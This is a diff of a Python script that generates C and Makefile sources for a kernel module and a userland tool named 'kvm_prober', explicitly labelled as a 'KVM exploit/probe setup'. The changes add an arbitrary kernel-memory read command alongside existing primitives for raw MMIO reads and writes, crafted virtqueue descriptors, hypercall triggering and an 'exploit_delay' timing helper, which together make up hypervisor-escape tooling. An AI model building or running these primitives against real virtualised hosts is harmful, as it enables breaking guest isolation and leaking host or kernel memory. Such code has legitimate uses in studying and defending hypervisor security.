         if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct mmio_data data = {{0}};
@@ -657,7 +695,8 @@ int main(int argc, char *argv[]) {{
         data.value_size = (unsigned int)strtoul(argv[3], NULL, 10);
         data.size = 0;
         if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) perror("ioctl READ_MMIO (value) failed");
-        else printf("MMIO 0x%lX (size %u) Value: 0x%lX (%lu)\\n", data.phys_addr, data.value_size, data.single_value, data.single_value);
+        else printf("MMIO 0x%lX (size %u) Value: 0x%lX (%lu)\n", data.phys_addr, data.value_size, data.single_value, data.single_value);
+
     }} else if (strcmp(cmd, "writemmio_val") == 0) {{
         if (argc != 5) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct mmio_data data = {{0}};
@@ -666,14 +705,15 @@ int main(int argc, char *argv[]) {{
         data.value_size = (unsigned int)strtoul(argv[4], NULL, 10);
         data.size = 0;
         if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0) perror("ioctl WRITE_MMIO (value) failed");
-        else printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\\n", data.single_value, data.phys_addr, data.value_size);
+        else printf("Wrote 0x%lX to MMIO 0x%lX (size %u)\n", data.single_value, data.phys_addr, data.value_size);
+
     }} else if (strcmp(cmd, "readmmio_buf") == 0) {{
         if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct mmio_data data = {{0}};
         data.phys_addr = strtoul(argv[2], NULL, 16);
         data.size = strtoul(argv[3], NULL, 10);
         if (data.size == 0 || data.size > 4096) {{
-            fprintf(stderr, "Invalid read size for buffer.\\n");
+            fprintf(stderr, "Invalid read size for buffer.\n");
             close(fd);
             return 1;
         }}
@@ -685,14 +725,15 @@ int main(int argc, char *argv[]) {{
         }}
         if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) perror("ioctl READ_MMIO (buffer) failed");
         else {{
-            printf("Read %lu bytes from MMIO 0x%lX:\\n", data.size, data.phys_addr);
+            printf("Read %lu bytes from MMIO 0x%lX:\n", data.size, data.phys_addr);
             for (unsigned long i = 0; i < data.size; ++i) {{
                 printf("%02X ", data.user_buffer[i]);
-                if ((i + 1) % 16 == 0) printf("\\n");
+                if ((i + 1) % 16 == 0) printf("\n");
             }}
-            if (data.size % 16 != 0) printf("\\n");
+            if (data.size % 16 != 0) printf("\n");
         }}
         free(data.user_buffer);
+
     }} else if (strcmp(cmd, "writemmio_buf") == 0) {{
         if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct mmio_data data = {{0}};
@@ -700,7 +741,7 @@ int main(int argc, char *argv[]) {{
         unsigned long num_bytes = 0;
         unsigned char *bytes_to_write = hex_string_to_bytes(argv[3], &num_bytes);
         if (!bytes_to_write || num_bytes == 0) {{
-            fprintf(stderr, "Failed to parse hex string or zero length.\\n");
+            fprintf(stderr, "Failed to parse hex string or zero length.\n");
             if(bytes_to_write) free(bytes_to_write);
             close(fd);
             return 1;
@@ -708,24 +749,27 @@ int main(int argc, char *argv[]) {{
         data.user_buffer = bytes_to_write;
         data.size = num_bytes;
         if (ioctl(fd, IOCTL_WRITE_MMIO, &data) < 0) perror("ioctl WRITE_MMIO (buffer) failed");
-        else printf("Wrote %lu bytes to MMIO 0x%lX from hex string.\\n", data.size, data.phys_addr);
+        else printf("Wrote %lu bytes to MMIO 0x%lX from hex string.\n", data.size, data.phys_addr);
         free(bytes_to_write);
+
     }} else if (strcmp(cmd, "allocvqpage") == 0) {{
         if (argc != 2) {{ print_usage(argv[0]); close(fd); return 1; }}
         unsigned long pfn_returned = 0;
         if (ioctl(fd, IOCTL_ALLOC_VQ_PAGE, &pfn_returned) < 0) {{
             perror("ioctl ALLOC_VQ_PAGE failed");
         }} else {{
-            printf("Allocated VQ page. PFN: 0x%lX\\n", pfn_returned);
-            printf("Guest Physical Address (approx, if PAGE_SIZE=4096): 0x%lX\\n", pfn_returned * 0x1000);
+            printf("Allocated VQ page. PFN: 0x%lX\n", pfn_returned);
+            printf("Guest Physical Address (approx, if PAGE_SIZE=4096): 0x%lX\n", pfn_returned * 0x1000);
         }}
+
     }} else if (strcmp(cmd, "freevqpage") == 0) {{
         if (argc != 2) {{ print_usage(argv[0]); close(fd); return 1; }}
         if (ioctl(fd, IOCTL_FREE_VQ_PAGE) < 0) {{
             perror("ioctl FREE_VQ_PAGE failed");
         }} else {{
-            printf("Sent FREE_VQ_PAGE command.\\n");
+            printf("Sent FREE_VQ_PAGE command.\n");
         }}
+
     }} else if (strcmp(cmd, "writevqdesc") == 0) {{
         if (argc != 7) {{ print_usage(argv[0]); close(fd); return 1; }}
         struct vq_desc_user_data d_data;
@@ -735,27 +779,30 @@ int main(int argc, char *argv[]) {{
         d_data.flags = (unsigned short)strtoul(argv[5], NULL, 16);
         d_data.next_idx = (unsigned short)strtoul(argv[6], NULL, 10);
 
-        fprintf(stderr, "[Prober: Sending WRITE_VQ_DESC for index %hu: GPA=0x%llx, len=%u, flags=0x%hx, next=%hu]\\n",
+        fprintf(stderr, "[Prober: Sending WRITE_VQ_DESC for index %hu: GPA=0x%llx, len=%u, flags=0x%hx, next=%hu]\n",
                 d_data.index, d_data.phys_addr, d_data.len, d_data.flags, d_data.next_idx);
 
         if (ioctl(fd, IOCTL_WRITE_VQ_DESC, &d_data) < 0) {{
             perror("ioctl IOCTL_WRITE_VQ_DESC failed");
         }} else {{
-            printf("Sent IOCTL_WRITE_VQ_DESC command.\\n");
+            printf("Sent IOCTL_WRITE_VQ_DESC command.\n");
         }}
+
     }} else if (strcmp(cmd, "trigger_hypercall") == 0) {{
         if (argc != 2) {{ print_usage(argv[0]); close(fd); return 1; }}
         long hypercall_ret = 0;
         if (ioctl(fd, IOCTL_TRIGGER_HYPERCALL, &hypercall_ret) < 0) {{
             perror("ioctl IOCTL_TRIGGER_HYPERCALL failed");
         }} else {{
-            printf("Hypercall triggered, return value: %ld\\n", hypercall_ret);
+            printf("Hypercall triggered, return value: %ld\n", hypercall_ret);
         }}
+
     }} else if (strcmp(cmd, "exploit_delay") == 0) {{
         if (argc != 3) {{ print_usage(argv[0]); close(fd); return 1; }}
         int delay_ns = atoi(argv[2]);
         exploit_delay(delay_ns);
-        printf("Delayed for %d nanoseconds.\\n", delay_ns);
+        printf("Delayed for %d nanoseconds.\n", delay_ns);
+
     }} else if (strcmp(cmd, "scanmmio") == 0) {{
         if (argc != 5) {{
             print_usage(argv[0]);
@@ -778,48 +825,50 @@ int main(int argc, char *argv[]) {{
             data.size = step;
             data.user_buffer = buf;
             if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) {{
-                printf("MMIO 0x%lX: <read error>\\n", addr);
+                printf("MMIO 0x%lX: <read error>\n", addr);
             }} else {{
                 printf("MMIO 0x%lX: ", addr);
                 for (unsigned long i = 0; i < step; ++i)
                     printf("%02X", buf[i]);
-                printf("\\n");
+                printf("\n");
             }}
         }}
         free(buf);
-    }} else if (strcmp(cmd, "scanmmio") == 0) {{
-        if (argc != 5) {{
-            print_usage(argv[0]);
+
+    }} else if (strcmp(cmd, "readkvmem") == 0) {{
+        if (argc != 4) {{ print_usage(argv[0]); close(fd); return 1; }}
+        struct kvm_kernel_mem_read req;
+        req.kernel_addr = strtoul(argv[2], NULL, 16);
+        req.length = strtoul(argv[3], NULL, 10);
+        if (req.length == 0 || req.length > 4096) {{
+            fprintf(stderr, "Invalid read length. (1-4096 supported in demo)\n");
             close(fd);
             return 1;
         }}
-        unsigned long start = strtoul(argv[2], NULL, 16);
-        unsigned long end = strtoul(argv[3], NULL, 16);
-        unsigned long step = strtoul(argv[4], NULL, 10);
-        struct mmio_data data = {{0}};
-        unsigned char *buf = malloc(step);
-        if (!buf) {{
-            perror("malloc for scanmmio buffer");
+        req.user_buf = malloc(req.length);
+        if (!req.user_buf) {{
+            perror("malloc for kernel mem read");
             close(fd);
             return 1;
         }}
-        for (unsigned long addr = start; addr < end; addr += step) {{
-            memset(buf, 0, step);
-            data.phys_addr = addr;
-            data.size = step;
-            data.user_buffer = buf;
-            if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) {{
-                printf("MMIO 0x%lX: <read error>\\n", addr);
-            }} else {{
-                printf("MMIO 0x%lX: ", addr);
-                for (unsigned long i = 0; i < step; ++i)
-                    printf("%02X", buf[i]);
-                printf("\\n");
+        if (ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {{
+            perror("ioctl IOCTL_READ_KERNEL_MEM failed");
+        }} else {{
+            printf("Kernel memory @ 0x%lx:\n", req.kernel_addr);
+            for (unsigned long i = 0; i < req.length; ++i) {{
+                printf("%02X", req.user_buf[i]);
+                if ((i + 1) % 16 == 0) printf("  ");
+                if ((i + 1) % 64 == 0) printf("\n");
             }}
+            printf("\n[ASCII]:\n");
+            for (unsigned long i = 0; i < req.length; ++i)
+                printf("%c", (req.user_buf[i] >= 0x20 && req.user_buf[i] < 0x7F) ? req.user_buf[i] : '.');
+            printf("\n");
         }}
-        free(buf);
+        free(req.user_buf);
+
     }} else {{
-        fprintf(stderr, "Unknown command: %s\\n", cmd);
+        fprintf(stderr, "Unknown command: %s\n", cmd);
         print_usage(argv[0]);
     }}
 
@@ -829,27 +878,26 @@ int main(int argc, char *argv[]) {{
 """
 
     makefile_code = f"""
-# Kernel module part
+# --- Makefile for KVM exploit/probe setup ---
+
 obj-m := kvm_probe_drv.o
 
-# The build directory for the kernel module
 KDIR := /lib/modules/$(shell uname -r)/build
-PWD := $(shell pwd)
+PWD  := $(shell pwd)
 
-# Userland exploit name (change as needed)
-USER_PROG := kvm_prober
+all: kvm_probe_drv.ko kvm_prober
 
-all: $(USER_PROG) kmod
+kvm_probe_drv.ko: kvm_probe_drv.c
+	$(MAKE) -C $(KDIR) M=$(PWD) modules
 
-$(USER_PROG): kvm_prober.c
-        gcc -Wall -O2 -o $(USER_PROG) kvm_prober.c
-
-kmod:
-        make -C $(KDIR) M=$(PWD) modules
+kvm_prober: kvm_prober.c
+	gcc -Wall -O2 -o kvm_prober kvm_prober.c
 
 clean:
-        make -C $(KDIR) M=$(PWD) clean
-        rm -f $(USER_PROG)
+	$(MAKE) -C $(KDIR) M=$(PWD) clean
+	rm -f kvm_prober
+
+.PHONY: all clean
 """
 
     try:
